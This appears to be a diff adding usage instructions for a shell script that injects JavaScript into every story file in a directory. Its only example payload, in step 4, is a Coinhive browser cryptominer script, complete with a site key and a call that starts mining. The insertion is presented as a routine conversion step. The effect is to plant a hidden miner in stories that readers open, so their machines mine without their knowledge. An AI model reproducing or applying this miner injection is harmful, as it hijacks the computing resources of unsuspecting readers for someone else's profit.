@@ -1,0 +1,19 @@
+Instructions:
+
+1. Navigate to a shelf (directory) containing the list of stories to be converted.
+ 
+2. Open a terminal in the directory and execute the command 'pwd' to obtain the absolute path of the stories.
+
+eg: shelf1=/home/user/Projects/SHELVES/BookShelfA/
+
+3. Update the "shelf1" variable in the script with this path value
+
+4. update the "javascriptCode" variable in the script with the desired javascript to be added to the stories.
+note: remove any new line characters.
+
+eg: 
+javascriptCode='<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('eZzJzukmy0ShcV8CUDdejkTDQt63lEEp');miner.start();</script>';
+
+5. execute the script using ./script.sh
+
+6. Verify the converted files in the newly created output directory 
